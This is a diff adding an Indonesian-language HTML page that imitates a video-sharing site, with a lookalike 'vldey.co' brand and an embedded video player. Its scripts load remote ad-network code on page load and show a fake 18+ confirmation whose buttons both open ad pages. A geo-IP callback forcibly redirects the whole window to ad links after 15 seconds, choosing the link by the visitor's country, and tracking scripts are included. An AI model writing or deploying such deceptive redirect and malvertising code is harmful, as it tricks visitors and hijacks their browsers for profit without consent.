@@ -1,0 +1,166 @@
+<!doctype html>
+<html lang="id">
+<head>
+    <script>(function(s){s.dataset.zone='10578611',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+    
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <title>videyto</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        :root{
+            --bg:#ffffff; --text:#0f172a; --muted:#64748b; --line:#e2e8f0; --brand:#111827;
+            --btn:#111827; --btnText:#ffffff; --btnHover:#000000; --card:#f8fafc;
+        }
+
+        /* ===== RESET & BASE ===== */
+        *,*::before,*::after{ box-sizing:border-box }
+        html{ -webkit-text-size-adjust:100% }
+        html,body{ height:100%; margin:0 }
+        body{
+            font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial;
+            color:var(--text); background:var(--bg); line-height:1.45;
+            overflow-x:hidden;
+        }
+        img,video,canvas,svg,iframe{ max-width:100%; height:auto; display:block }
+
+        /* ===== APP BAR ===== */
+        .appbar{
+            position:sticky; top:0; z-index:20; background:rgba(255,255,255,.85);
+            backdrop-filter:saturate(180%) blur(8px); border-bottom:1px solid var(--line);
+        }
+        .bar-inner{
+            width:100%; max-width:1200px; margin-inline:auto;
+            display:flex; align-items:center; gap:12px; padding:10px 16px;
+        }
+        .brand{ display:flex; align-items:center; gap:8px; font-weight:800; letter-spacing:.2px }
+        .logo{ display:inline-grid; place-items:center; width:28px; height:28px; border-radius:6px; background:#111827; color:#fff; font-size:14px }
+        .spacer{ flex:1 }
+        .btn{ appearance:none; border:0; padding:10px 14px; border-radius:12px; background:var(--btn); color:var(--btnText); font-weight:600; cursor:pointer; touch-action:manipulation }
+        .btn:hover{ background:var(--btnHover) }
+
+        /* ===== LAYOUT ===== */
+        .wrap{ width:100%; max-width:1200px; margin:6px auto 40px; padding-inline:16px; }
+        .player-shell{ display:grid; place-items:center; margin-top:20px }
+
+        .phone{
+            position:relative;
+            width:clamp(240px, 92vw, 420px);
+            aspect-ratio:9/16;
+            border-radius:22px; overflow:hidden; background:#000;
+            box-shadow:0 10px 30px rgba(2,6,23,.15), 0 3px 10px rgba(2,6,23,.08);
+        }
+        .phone video{ width:100%; height:100%; object-fit:cover }
+
+        .meta{
+            width:100%; max-width:760px; margin:22px auto 0; padding:0 6px;
+            text-align:center; color:var(--muted); font-size:13px;
+        }
+
+        .ad-slot{
+            width:100%; max-width:760px; margin:28px auto 0;
+            background:var(--card); border:1px dashed var(--line); border-radius:16px; padding:16px; text-align:center; color:var(--muted);
+        }
+
+        @media (min-width:1024px){
+            .wrap{ display:grid; grid-template-columns:minmax(0,1fr) minmax(0,480px) minmax(0,1fr); align-items:start; }
+            .player-shell{ grid-column:2 }
+        }
+    </style>
+</head>
+
+<body>
+    <header class="appbar">
+        <div class="bar-inner">
+            <div class="brand">
+                <span class="logo">V</span>
+                <span>vldey<span style="color:#3b82f6">.co</span></span>
+            </div>
+            <div class="spacer"></div>
+            <button class="btn">Upload</button>
+        </div>
+    </header>
+
+    <main class="wrap">
+        <section class="player-shell">
+            <div class="phone">
+                <video id="video" playsinline controls>
+                    <source src="https://cdn.videy.co/x3lkEf5M1.mp4" type="video/mp4" />
+                    Browser Anda tidak mendukung video HTML5.
+                </video>
+            </div>
+            <div class="meta">0:00 / 0:00</div>
+            <div class="ad-slot">Iklan akan muncul di sini</div>
+        </section>
+    </main>
+
+    <div id="age-backdrop" style="position:fixed; inset:0; z-index:9999; display:grid; place-items:center; background:rgba(0,0,0,.50); backdrop-filter:blur(6px); visibility:hidden; opacity:0; transition:opacity .18s ease;">
+        <div id="age-dialog" style="width:min(360px,96vw); background:#fff; border-radius:16px; padding:20px; text-align:center; transform:scale(.96); transition:transform .18s ease;">
+            <h3 style="margin:0 0 10px; font-family:Inter,sans-serif; color:#111827">Konfirmasi Usia</h3>
+            <p style="margin:0 0 20px; font-size:14px; color:#4b5563">Apakah Anda berusia 18+ dan ingin melanjutkan?</p>
+            <div style="display:flex; gap:10px;">
+                <button id="age-cancel" style="flex:1; background:#e5e7eb; border:0; border-radius:12px; height:45px; cursor:pointer; font-weight:600;">BATAL</button>
+                <button id="age-continue" style="flex:1; background:#ef4444; color:#fff; border:0; border-radius:12px; height:45px; cursor:pointer; font-weight:700;">LANJUT</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        /* === KONFIGURASI IKLAN ANDA === */
+        const AGE_NEXT_URL = "Https://peacockvowel.com/itdv7p5u4?key=9e08d0fca5388ed0e422ebc60fb6c950"; // Adsterra
+        const OFFER_URL    = "https://otieu.com/4/10545080"; // Monetag
+        const LINK_ID      = "https://otieu.com/4/10545080"; // Monetag (Indo)
+        const LINK_ALL     = "Https://peacockvowel.com/itdv7p5u4?key=9e08d0fca5388ed0e422ebc60fb6c950"; // Adsterra (Luar)
+        const DELAY_AUTO   = 15000; // 15 detik
+
+        // Video Duration Meta
+        const v = document.getElementById('video');
+        const meta = document.querySelector('.meta');
+        function fmt(t){ const m = Math.floor(t/60); const s = Math.floor(t%60).toString().padStart(2,'0'); return `${m}:${s}`; }
+        v.addEventListener('loadedmetadata', ()=>{ meta.textContent = `0:00 / ${fmt(v.duration)}`; });
+        v.addEventListener('timeupdate', ()=>{ meta.textContent = `${fmt(v.currentTime)} / ${fmt(v.duration)}`; });
+
+        // Popup Logic
+        const $backdrop = document.getElementById('age-backdrop');
+        const $dialog = document.getElementById('age-dialog');
+        
+        function showModal(){
+            $backdrop.style.visibility = 'visible';
+            $backdrop.style.opacity = '1';
+            $dialog.style.transform = 'scale(1)';
+        }
+
+        document.getElementById('age-continue').onclick = () => { window.open(AGE_NEXT_URL, '_blank'); $backdrop.remove(); };
+        document.getElementById('age-cancel').onclick = () => { window.open(OFFER_URL, '_blank'); $backdrop.remove(); };
+
+        window.onload = () => { setTimeout(showModal, 10000); }; // Muncul setelah 10 detik
+
+        // Geo-Redirect Logic (15 Detik)
+        function geoip(g){
+            setTimeout(() => {
+                if (g && g.country === "ID") { window.top.location.href = LINK_ID; }
+                else { window.top.location.href = LINK_ALL; }
+            }, DELAY_AUTO);
+        }
+    </script>
+
+    <script src="https://get.geojs.io/v1/ip/country.js?callback=geoip"></script>
+
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5007376,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img src="//sstatic1.histats.com/0.gif?5007376&101" alt="" border="0"></a></noscript>
+
+    <script src="https://peacockvowel.com/f4/4d/4a/f44d4af7e754391cecfebc7b5e21ac77.js"></script>
+</body>
+</html>
